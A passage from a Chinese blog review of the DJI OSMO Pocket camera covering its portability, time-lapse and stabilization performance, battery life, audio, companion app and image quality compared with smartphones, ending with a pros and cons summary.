的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]